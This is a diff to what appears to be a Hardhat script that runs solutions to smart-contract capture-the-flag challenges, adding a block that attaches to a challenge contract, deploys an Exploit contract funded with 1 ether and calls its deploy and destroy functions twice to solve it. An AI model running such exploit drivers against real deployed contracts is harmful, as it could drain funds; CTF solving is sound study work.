@@ -226,6 +226,30 @@ async function main() {
         await res.wait();
         console.log(author, ":", await setup.isSolved());
     }
+
+    // teryanarmen
+    author = "teryanarmen";
+    SETUP = await ethers.getContractFactory("contracts/" + author + "/Setup.sol:Setup");
+    setup = await SETUP.attach("0xAD392F2a981bDE60B43eC988a30ce2aE2d755eD2");
+    challenge = await ethers.getContractAt("Challenge2", await setup.challenge());
+    if (challenge.address != "0x8720D38BbC9212B8fD202BCcda07cff32b6F7920")
+    {
+        console.log("address:", challenge.address);
+        throw("error");
+    }
+    solved = await setup.isSolved();
+    console.log(author, ":", solved);
+
+    if (!solved)
+    {
+        const EXPLOIT = await ethers.getContractFactory("contracts/" + author + "/Exploit.sol:Exploit");
+        exploit = await EXPLOIT.deploy(challenge.address, {value: parseEther("1")});
+        await (await exploit.deploy()).wait();
+        await (await exploit.destroy()).wait();
+        await (await exploit.deploy()).wait();
+        await (await exploit.destroy()).wait();
+        console.log(author, ":", await setup.isSolved());
+    }
 }
 
 
